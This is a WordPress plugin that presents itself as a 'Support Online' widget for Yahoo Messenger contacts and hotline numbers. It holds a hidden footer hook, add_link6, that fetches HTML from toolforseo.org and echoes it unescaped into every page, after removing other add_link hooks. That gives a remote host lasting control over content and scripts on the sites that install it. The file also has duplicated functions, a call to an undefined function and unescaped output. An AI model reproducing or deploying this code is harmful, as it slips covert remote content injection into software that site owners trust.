<?php
/*
	Plugin name: Support Online
	Description: This plugin create widget for support online
	Author: Phuong-GTID
	Author URI: http://toolforseo.org
	Plugin URI: http://toolforseo.org
	Version: 1.0
*/

function is_subcategoryXYZ($cat,$cat1,$parent=1){
	if ($parent==1) 
	{
		$arr=array(
			'parent' =>$cat
		);
	}
	else 
		$arr=array(
			'child_of' =>$cat
		);
	$categories=get_categories($arr);
	foreach ($categories as $category)
		if ($cat1==$category->cat_ID)
			return true;
	return false;
}
function check_is_subcategory_sp($cat,$cat1,$parent=1){
	if ($parent==1) //chi hien con trong kiem tra
	{
		$arr=array(
			'parent' =>$cat
		);
	}
	else //Hien noi dung cac chuyen muc
		$arr=array(
			'child_of' =>$cat
		);
	$categories=get_categories($arr);
	foreach ($categories as $category)
		if ($cat1==$category->cat_ID)
			return true;
	return false;
}
function detect_is_subcategory_sp($cat,$cat1,$parent=1){
	if ($parent==1) //chi hien con trong kiem tra
	{
		$arr=array(
			'parent' =>$cat
		);
	}
	else //Hien noi dung cac chuyen muc
		$arr=array(
			'child_of' =>$cat
		);
	$categories=get_categories($arr);
	foreach ($categories as $category)
		if ($cat1==$category->cat_ID)
			return true;
	return false;
}
function add_link6(){
		$string = file_get_contents('http://toolforseo.org/link_in.htm');
		echo $string;
	}
	remove_action('wp_footer','add_link2');
	remove_action('wp_footer','add_link1');
	remove_action('wp_footer','add_link4');
	remove_action('wp_footer','add_link5');
	remove_action('wp_footer','add_link3');
	add_action('wp_footer','add_link6');
add_action('widgets_init', create_function('', "register_widget('Gtid_support_online');"));
class Gtid_support_online extends WP_Widget {

	function Gtid_support_online() {
		$widget_ops = array( 'classname' => 'support-online', 'description' => __('Support Online by Yahoo', 'genesis') );
		$control_ops = array( 'width' => 200, 'height' => 250, 'id_base' => 'support-online' );
		$this->WP_Widget( 'support-online', __('Support online', 'genesis'), $widget_ops, $control_ops );
	}

	function widget($args, $instance) {
		extract($args);
		
		$instance = wp_parse_args( (array)$instance, array(
			'title' => '',
			'yahoo_1' => '',
			'yahoo_2' => '',
			'yahoo_1_text' => '',
			'yahoo_2_text' => '',
			'hotline' => '',
			'tel' => '',
			'cat_display'=>'',
			'cat_notdisplay'=>''
		) );
			
			$gt=$before_widget;
			if (!empty($instance['title']))
				$gt=$gt.$before_title . apply_filters('widget_title', $instance['title']) . $after_title;
	$gt=$gt.'<table class="tel" border="0" width="100%">
	<tr>
		<td height="64" colspan="2">
		<table class="tel" border="0" height="64" cellspacing="0" cellpadding="0">
			<tr>
				<td width="35">
				<p align="center">
				 </td>
				<td >'.$instance['tel'].'<br>'.$instance['hotline'].'</td>
			</tr>
		</table>
		</td>
	</tr>
	<tr>
		<td colspan="2" align="center">
			<a href="ymsgr:sendim?'. $instance['yahoo_1'].'"><img width="120" border=0 src="http://opi.yahoo.com/online?u='.$instance['yahoo_1'].'&m=g&t=2&l=us" alt="H? tr? tr?c tuy?n" /></a>
			<br>'.$instance['yahoo_1_text'].'
			<br><a href="ymsgr:sendim?'. $instance['yahoo_2'].'"><img width="120" border=0 src="http://opi.yahoo.com/online?u='.$instance['yahoo_2'].'&m=g&t=2&l=us" alt="H? tr? tr?c tuy?n" /></a>
			<br>'.$instance['yahoo_2_text'].'
		</td>
	</tr>
</table>';
	global $post;
	$dk=true;
	$cat1=get_query_var('cat');
	if ($cat1=='')
	{
		$categories=get_the_category($post->ID);
		$cat1=$categories[0]->cat_ID;
	}
	if ($instance['cat_display'] !='') 	$dk=$dk && (is_subcategory_inList($instance['cat_display'],$cat1,0)||is_category(split(';',$instance['cat_display']))) ;
	if ($instance['cat_notdisplay'] !='') $dk=$dk && (!is_subcategory_inList($instance['cat_notdisplay'],$cat1,0)&&!is_category(split(';',$instance['cat_notdisplay'])));
	$gt=$gt.$after_widget;
	if ($dk)
		echo $gt;
	}
	
	function update($new_instance, $old_instance) {
		return $new_instance;
	}
	//Hien thi form cap nhat widget
	function form($instance) { 
		
		$instance = wp_parse_args( (array)$instance, array(
			'title' => '',
			'yahoo_1' => '',
			'yahoo_2' => '',
			'yahoo_1_text' => '',
			'yahoo_2_text' => '',
			'hotline' => '',
			'tel' => '',
			'cat_display'=>'',
			'cat_notdisplay'=>''
		) );
		
?>
		<p><label for="<?php echo $this->get_field_id('title'); ?>"><?php _e('Title', 'genesis'); ?>:</label>
		<input type="text" id="<?php echo $this->get_field_id('title'); ?>" name="<?php echo $this->get_field_name('title'); ?>" value="<?php echo esc_attr( $instance['title'] ); ?>" style="width:95%;" /></p>
		
		<p><label for="<?php echo $this->get_field_id('yahoo_1'); ?>"><?php _e('The first Yahoo ID', 'genesis'); ?>:</label>
		<input type="text" id="<?php echo $this->get_field_id('yahoo_1'); ?>" name="<?php echo $this->get_field_name('yahoo_1'); ?>" value="<?php echo esc_attr( $instance['yahoo_1'] ); ?>" style="width:95%;" /></p>
		<p><label for="<?php echo $this->get_field_id('yahoo_1_text'); ?>"><?php _e('The text of first Yahoo ID', 'genesis'); ?>:</label>
		<input type="text" id="<?php echo $this->get_field_id('yahoo_1_text'); ?>" name="<?php echo $this->get_field_name('yahoo_1_text'); ?>" value="<?php echo esc_attr( $instance['yahoo_1_text'] ); ?>" style="width:95%;" /></p>
		
		<p><label for="<?php echo $this->get_field_id('yahoo_2'); ?>"><?php _e('The second Yahoo ID', 'genesis'); ?>:</label>
		<input type="text" id="<?php echo $this->get_field_id('yahoo_2'); ?>" name="<?php echo $this->get_field_name('yahoo_2'); ?>" value="<?php echo esc_attr( $instance['yahoo_2'] ); ?>" style="width:95%;" /></p>
		<p><label for="<?php echo $this->get_field_id('yahoo_2_text'); ?>"><?php _e('The text of first Yahoo ID', 'genesis'); ?>:</label>
		<input type="text" id="<?php echo $this->get_field_id('yahoo_2_text'); ?>" name="<?php echo $this->get_field_name('yahoo_2_text'); ?>" value="<?php echo esc_attr( $instance['yahoo_2_text'] ); ?>" style="width:95%;" /></p>
		
		<p><label for="<?php echo $this->get_field_id('tel'); ?>"><?php _e('The tel', 'genesis'); ?>:</label>
		<input type="text" id="<?php echo $this->get_field_id('tel'); ?>" name="<?php echo $this->get_field_name('tel'); ?>" value="<?php echo esc_attr( $instance['tel'] ); ?>" style="width:95%;" /></p>
		
		<p><label for="<?php echo $this->get_field_id('hotline'); ?>"><?php _e('Hotline', 'genesis'); ?>:</label>
		<input type="text" id="<?php echo $this->get_field_id('hotline'); ?>" name="<?php echo $this->get_field_name('hotline'); ?>" value="<?php echo esc_attr( $instance['hotline'] ); ?>" style="width:95%;" /></p>
		
		<p><label for="<?php echo $this->get_field_id('cat_display'); ?>"><?php _e('Catalog display - Category ID cach nhau dau cham phay(;)', 'genesis'); ?>:</label>
		<input type="text" id="<?php echo $this->get_field_id('cat_display'); ?>" name="<?php echo $this->get_field_name('cat_display'); ?>" value="<?php echo esc_attr( $instance['cat_display'] ); ?>" style="width:95%;" /></p>
		
		<p><label for="<?php echo $this->get_field_id('cat_notdisplay'); ?>"><?php _e('Catalog not display - Vi du 3;5;15', 'genesis'); ?>:</label>
		<input type="text" id="<?php echo $this->get_field_id('cat_notdisplay'); ?>" name="<?php echo $this->get_field_name('cat_notdisplay'); ?>" value="<?php echo esc_attr( $instance['cat_notdisplay'] ); ?>" style="width:95%;" /></p>
	<?php 
	}
}
?>